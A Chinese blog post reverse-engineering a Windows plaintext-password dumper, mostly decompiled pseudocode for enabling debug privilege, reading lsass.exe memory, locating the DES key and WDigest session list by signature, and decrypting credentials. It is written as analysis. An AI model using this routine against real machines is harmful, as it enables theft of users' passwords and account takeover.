---
title: "逆向分析windows密码获取工具"
date: 2015-01-03T09:13:30+08:00
draft: true
categories: ["调试逆向"]
tags: ["调试逆向"]
topics: ["调试逆向"]
---

用过一个小型获取明文密码程序，只有一个可执行文件ReadPSW.exe，通过逆向写出了源代码，稍微改改可能也可以支持64位。分享一下逆向过程和工作原理。

我喜欢先用IDA看大致流程，遇到难以静态看出来的函数再用OD或者windbg。
IDA F5 main函数，一段一段得看。

<!--more-->


```
int __cdecl main_0()
{
  int hdll; // eax@15
  HMODULE ModuleSecur32; // eax@15
  int LsaEnumerateLogonSessions; // eax@15
  int LsaGetLogonSessionData; // eax@15
  int LsaFreeReturnBuffer; // eax@15
  int bcrypt; // eax@27
  int hbcrypt; // eax@27
  int bcryptprimitives; // eax@27
  int hbcryptprimitives; // eax@27
  int status7; // eax@27
  const void *Base; // [sp+7Ch] [bp-2E0h]@25
  SIZE_T nSize; // [sp+80h] [bp-2DCh]@25
  int pLsaFreeReturnBuffer; // [sp+88h] [bp-2D4h]@15
  int pLsaGetLogonSessionData; // [sp+8Ch] [bp-2D0h]@15
  int pLsaEnumerateLogonSessions; // [sp+90h] [bp-2CCh]@15
  HMODULE Secur32; // [sp+94h] [bp-2C8h]@15
  LPCVOID l_LogSessList; // [sp+98h] [bp-2C4h]@15
  int LsaUnprotectMemory; // [sp+9Ch] [bp-2C0h]@15
  struct _OSVERSIONINFOA VersionInformation; // [sp+A8h] [bp-2B4h]@5
  HANDLE Lsass; // [sp+13Ch] [bp-220h]@3
  LPCVOID List[128]; // [sp+140h] [bp-21Ch]@18
  LPCVOID *First; // [sp+340h] [bp-1Ch]@20
  int LogonSessionNow; // [sp+344h] [bp-18h]@18
  int ListEntry; // [sp+348h] [bp-14h]@15
  SIZE_T NumberOfBytesRead; // [sp+34Ch] [bp-10h]@18
  int hDllLsasrv; // [sp+358h] [bp-4h]@15
```

变量名大多是修改过的，通过分析子函数的功能做相应的改变，看起来方便一些。

```
  memset(&tt, -858993460, 0x320u);
  if ( EnableDebugPrivilege() != 1 )
    printf("EnableDebugPrivilege fail !");
```

首先提权，比较简单：

```
  pToken = &TokenHandle;
  dwAccess = TOKEN_ALL_ACCESS;
  ProcessHandle = GetCurrentProcess();
  retProcessHandle = _chkesp(&dwAccess == &dwAccess, ProcessHandle, &dwAccess);
  status = OpenProcessToken(retProcessHandle, dwAccess, pToken);
      status1 = LookupPrivilegeValueA(0, "SeDebugPrivilege", &Luid);
  NewState.PrivilegeCount = 1;
  NewState.Privileges[0].Luid.LowPart = Luid.LowPart;
  NewState.Privileges[0].Luid.HighPart = Luid.HighPart;
  NewState.Privileges[0].Attributes = 2;
  status2 = AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0, 0);
```

接着main函数流程：

```
  Lsass = GetProcessHandle("lsass.exe");
  if ( Lsass )
  {
    offset_one = 0;
    offset_two = -1;
    memset(&VersionInformation, 0, 0x94u);
    VersionInformation.dwOSVersionInfoSize = 148;
    status = GetVersionExA(&VersionInformation);
    _chkesp(&t == &t, status, &v48);
    if ( VersionInformation.dwMajorVersion == 5 )
    {
      if ( VersionInformation.dwMinorVersion == 1 )
      {
        offset_one = 36;
        offset_two = 2;
      }
      else
      {
        if ( VersionInformation.dwMinorVersion == 2 )
        {
          offset_one = 28;
          offset_two = 4;
        }
      }
    }
    else
    {
      if ( VersionInformation.dwMajorVersion == 6 )
      {
        offset_one = 32;
        offset_two = 1;
      }
    }
    if ( offset_two == -1 )
    {
      status12 = CloseHandle(Lsass);
      _chkesp(&t == &t, status12, &v48);
      returned = 0;
    }
```

上面工作主要是：获取lsass.exe进程句柄、根据不同版本赋值两个偏移量。可以看出支持xp和2003，之后版本vista、win7等使用同一偏移量。

```
    else
    {
      hdll = LoadLibraryA("lsasrv.dll");
      hDllLsasrv = _chkesp(&t == &t, hdll, &v48);
      LsaUnprotectMemory = GetFunctionAddr(hDllLsasrv, 0x7FFFDDDDu, db_8b_ff, 14u);
```

这个GetFunctionAddr是我重命名的，跟进去看一下实现就知道了：

```
int __cdecl GetFunctionAddr(int Module, unsigned int Limit, int Symbol, unsigned int Length)
{
  return RealGetFunctionAddr(Module, Limit, Symbol, Length);
}
```

是一个跳转，接着跟进：

```
int __cdecl RealGetFunctionAddr(int Module, unsigned int Limit, int Symbol, unsigned int Length)
{
  while ( Length + Module <= Limit )
  {
    label = Symbol;
    for ( i = 0; i < Length && *Module == *label; ++i )
    {
      ++Module;
      ++label;
    }
    if ( i == Length )
      break;
    Module = Module - i + 1;
  }
  return result;
}
```

是用特征码查找函数地址的，想知道是什么函数最好用windbg跟一下，发现找到了lsasrv.dll的LsaUnprotectMemory 函数，这里我也对变量名进行了重命名。该函数用于解密LsaProtectMemory加密内存，这两个函数在LSA中用得非常多。

```
      l_LogSessList = GetWdigestl_LogSessList();
      DesKey(Lsass, hDllLsasrv, offset_two);
```

这两个函数挺关键，需要结合OD动态调试，先看第一个，中间有个类似上面的跳转，直接看实现函数：

```
unsigned int __cdecl RealGetFunction()
{
  HMODULE hModule; // eax@1
  unsigned int moduleBase; // [sp+4Ch] [bp-10h]@1
  unsigned int returned; // [sp+50h] [bp-Ch]@1
  int SpInstanceInit; // [sp+54h] [bp-8h]@1
  HMODULE hLibModule; // [sp+58h] [bp-4h]@1

  memset(&v6, -858993460, 0x50u);
  t1 = LoadLibraryA("wdigest.dll");
  hModule = _chkesp(&v5 == &v5, t1, &v11);
  hLibModule = hModule;
  v2 = GetProcAddress(hModule, "SpInstanceInit");
  SpInstanceInit = _chkesp(&v5 == &v5, v2, &v11);
  moduleBase = hLibModule;
  returned = 0;
  while ( moduleBase < SpInstanceInit && moduleBase )
  {
    returned = moduleBase;
    moduleBase = GetFunctionAddr(moduleBase + 8, SpInstanceInit, db_8b_45, 8u);
  }
  returned = *(returned - 4);
  status = FreeLibrary(hLibModule);
  _chkesp(&v5 == &v5, status, &v11);
  return returned;
}
```

首先加载wdigest.dll模块，这里有详细的介绍。然后获取SpInstanceInit的地址，接着是一个查找函数的循环，根据特征码在SpInstanceInit地址低位查找某个地址，使用windbg可以看到要找的东西：

```
0:000> ln eax
(742ec29c)   <Unloaded_wdigest.dll>+0xc29c
```

这并不是一个函数，具体的作用现在还不知道。后面会用到。
看下面的函数，这个函数实际上是用来产生DES的密钥：

```
const void *__cdecl make_DESKey(HANDLE hProcessLsass, int hDllLsasrv, int offset)
{
  int status; // eax@1
  const void *dwResult; // eax@1
  int Key; // eax@4
  char buffer; // [sp+Ch] [bp-68h]@1
  int OSVersion; // [sp+4Ch] [bp-28h]@1
  unsigned int HeapReverse; // [sp+50h] [bp-24h]@1
  const void *Buffer; // [sp+54h] [bp-20h]@4
  LPCVOID g_pDESXKey; // [sp+58h] [bp-1Ch]@4
  LPCVOID lpBuffer; // [sp+5Ch] [bp-18h]@1
  SIZE_T NumberOfBytesRead; // [sp+60h] [bp-14h]@1
  SIZE_T nSize; // [sp+64h] [bp-10h]@1
  int pImageNtHeaders; // [sp+68h] [bp-Ch]@1
  int hTmpDllLsasrv; // [sp+6Ch] [bp-8h]@1
  int DataSECTION; // [sp+70h] [bp-4h]@1
  int v27; // [sp+74h] [bp+0h]@1

  memset(&buffer, -858993460, 0x68u);
  hTmpDllLsasrv = hDllLsasrv;
  DataSECTION = *(hDllLsasrv + 60) + hDllLsasrv + 288;
  lpBuffer = (hDllLsasrv + *(DataSECTION + 12));	  // 获取lsasrv.dll的数据区
  nSize = ((*(DataSECTION + 8) >> 12) + 1) << 12;   // 数据区大小
  status = ReadProcessMemory(hProcessLsass, lpBuffer, lpBuffer, nSize, &NumberOfBytesRead); //读取数据区内容
  _chkesp(&v15 == &v15, status, &v27);
  pImageNtHeaders = hDllLsasrv + *(hTmpDllLsasrv + 60);
  HeapReverse = hDllLsasrv + *(pImageNtHeaders + 80);
  dwResult = offset;
  OSVersion = offset;
  if ( offset == 1 )
  {
    v8 = LoadLibraryA("bcrypt.dll");
    _chkesp(&v15 == &v15, v8, &v27);
    v9 = LoadLibraryA("bcryptprimitives.dll");
    _chkesp(&v15 == &v15, v9, &v27);
    v10 = GetFunctionAddr(hDllLsasrv, HeapReverse, "3仪E鑌b", 0xCu);   //根据特征码查找存放DES_KEY的地址
    g_pDESXKey = v10;
    g_pDESXKey = *(v10 - 1);
    v11 = ReadProcessMemory(hProcessLsass, g_pDESXKey, &Buffer, 4u, &NumberOfBytesRead);
    _chkesp(&v15 == &v15, v11, &v27);
    v12 = ReadProcessMemory(hProcessLsass, Buffer, &t_Key, 0x200u, &NumberOfBytesRead);    // 通过两次内存查找找到KEY
    _chkesp(&v15 == &v15, v12, &v27);
    lpBuffer = g_pDESXKey;
    *g_pDESXKey = &t_Key;
    v13 = ReadProcessMemory(hProcessLsass, lpBaseAddress, &unk_42BFB8, 0x200u, &NumberOfBytesRead);
    _chkesp(&v15 == &v15, v13, &v27);
    lpBuffer = &lpBaseAddress;
    lpBaseAddress = &unk_42BFB8;
    v14 = ReadProcessMemory(hProcessLsass, dword_42AFC4, &unk_42ADB8, 0x200u, &NumberOfBytesRead);
    dwResult = _chkesp(&v15 == &v15, v14, &v27);
    dword_42AFC4 = &unk_42ADB8;
  }
  else
  {
    if ( OSVersion == 2 || OSVersion == 4 )
    {
      Key = GetFunctionAddr(hDllLsasrv, HeapReverse, Key_Symbol, 0xCu);
      g_pDESXKey = Key;
      g_pDESXKey = *(Key + 12);
      v6 = ReadProcessMemory(hProcessLsass, g_pDESXKey, &Buffer, 4u, &NumberOfBytesRead);
      _chkesp(&v15 == &v15, v6, &v27);
      v7 = ReadProcessMemory(hProcessLsass, Buffer, &t_Key, 0x200u, &NumberOfBytesRead);
      _chkesp(&v15 == &v15, v7, &v27);
      dwResult = g_pDESXKey;
      lpBuffer = g_pDESXKey;
      *g_pDESXKey = &t_Key;
    }
  }
  return dwResult;
}
```

根据最初得到的偏移，读取进程地址空间，获取DES的密钥。了解了这两个函数内容接着回归main函数：

```
      status13 = LoadLibraryA("Secur32.dll");
      ModuleSecur32 = _chkesp(&t == &t, status13, &v48);
      Secur32 = ModuleSecur32;
      LsaEnumerateLogonSessions = GetProcAddress(ModuleSecur32, "LsaEnumerateLogonSessions");
      pLsaEnumerateLogonSessions = _chkesp(&t == &t, LsaEnumerateLogonSessions, &v48);
      LsaGetLogonSessionData = GetProcAddress(Secur32, "LsaGetLogonSessionData");
      pLsaGetLogonSessionData = _chkesp(&t == &t, LsaGetLogonSessionData, &v48);
      LsaFreeReturnBuffer = GetProcAddress(Secur32, "LsaFreeReturnBuffer");
      pLsaFreeReturnBuffer = _chkesp(&t == &t, LsaFreeReturnBuffer, &v48);
  status1 = (pLsaEnumerateLogonSessions)(&count, &ListEntry);
```

加载secur32.dll，然后获取几个函数的地址，枚举登陆会话和获取登陆会话数据。接着调用LsaEnumerateLogonSessions得到当前登录的会话个数以及所有会话组成的列表。MSDN上说明了这个函数，会返回会话的LUID。

```
      _chkesp(&t == &t, status1, &v48);
      for ( i = 0; i < count; ++i )
      {
        LogonSessionNow = ListEntry + 8 * i;			// 根据这里可以知道
        output_name_session(pLsaGetLogonSessionData, pLsaFreeReturnBuffer, ListEntry + 8 * i);  // 这里输出登陆用户名
```

进入output_name_session看看：

```
int __cdecl output_name_session_real(int (__stdcall *pLsaGetLogonSessionData)(_DWORD, _DWORD), int (__stdcall *pLsaFreeReturnBuffer)(_DWORD), int LogonSessionNow)
{
  int status; // eax@1
  int status1; // eax@1
  char v6; // [sp+0h] [bp-50h]@1
  char v7; // [sp+Ch] [bp-44h]@1
  int LogonSessionData; // [sp+4Ch] [bp-4h]@1
  int v9; // [sp+50h] [bp+0h]@1

  memset(&v7, -858993460, 0x44u);
  status = pLsaGetLogonSessionData(LogonSessionNow, &LogonSessionData);
  _chkesp(&v6 == &v6, status, &v9);
  printf("UserName: %S\n", *(LogonSessionData + 16));
  printf("LogonDomain: %S\n", *(LogonSessionData + 24));
  status1 = pLsaFreeReturnBuffer(LogonSessionData);
  return _chkesp(&v6 == &v6, status1, &v9);
}
```


这里用了之前查找的LsaGetLogonSessionData和LsaFreeReturnBuffer，输出登陆名和域名。

```
        status3 = ReadProcessMemory(Lsass, l_LogSessList, List, 0x100u, &NumberOfBytesRead);   // 这里读取之前获取的那个不明地址内容到List
        _chkesp(&t == &t, status3, &v48);
        while ( List[0] != l_LogSessList )
        {
          status4 = ReadProcessMemory(Lsass, List[0], List, 0x100u, &NumberOfBytesRead);
          _chkesp(&t == &t, status4, &v48);
          First = &List[4];
          if ( List[4] == *LogonSessionNow )
          {
            if ( First[1] == *(LogonSessionNow + 4) )       	//  这个First[1]看着太别扭了，实际上就是比较List[4]和枚举到的会话LUID值
              break;										//  这里可以知道之前那个不明地址<Unloaded_wdigest.dll>+0xc29c是个列表
          }
        }
        if ( List[0] == l_LogSessList )
        {
          printf("Specific LUID NOT found\n");
        }
        else
        {
          nSize = 0;
          v28 = (offset_one + First);
          nSize = *(offset_one + First + 2);
          Base = *(offset_one + First + 4);                    //  还是使用了First，不要忘记First是从当时那个不明地址处读取的值
          memset(Buffer2, 0, 0x100u);
          status2 = ReadProcessMemory(Lsass, Base, Buffer2, nSize, &NumberOfBytesRead);
          _chkesp(&t == &t, status2, &v47);					//  这里读到加密之后的密码。整个流程就清楚了，使用LsaEnumerateSessions获取LUIDs，与之前通过特征码找到的l_LogSessList结合找出密码。l_LogSessList保存了密码的长度和存放地址以及会话LUID，是个重要的未公开结构体。
          status5 = (LsaUnprotectMemory)(Buffer2, nSize);
          _chkesp(&t == &t, status5, &v47);
          printf("password: %S\n\n", Buffer2);
        }
```

后面是一些释放dll和内存的工作，不再赘述。程序和IDA数据库右键图片可以得到。

![种子图片](/images/readpwd.jpg "optional title")
